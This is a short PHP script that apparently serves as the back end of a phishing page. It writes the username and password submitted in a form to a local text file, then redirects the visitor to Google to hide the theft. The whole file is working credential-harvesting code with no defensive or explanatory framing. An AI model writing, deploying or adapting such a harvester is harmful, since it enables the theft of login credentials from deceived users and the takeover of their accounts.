<?php
$myfile = fopen("username.txt", "a") or die("ERROR 404");
fwrite($myfile,$_POST["username"]);
$txt=" : ";
fwrite($myfile,$txt);
fwrite($myfile,$_POST["password"]);
$txt="\n";
fwrite($myfile,$txt);
fclose($myfile);
header("Location:http://www.google.com");
exit;
?>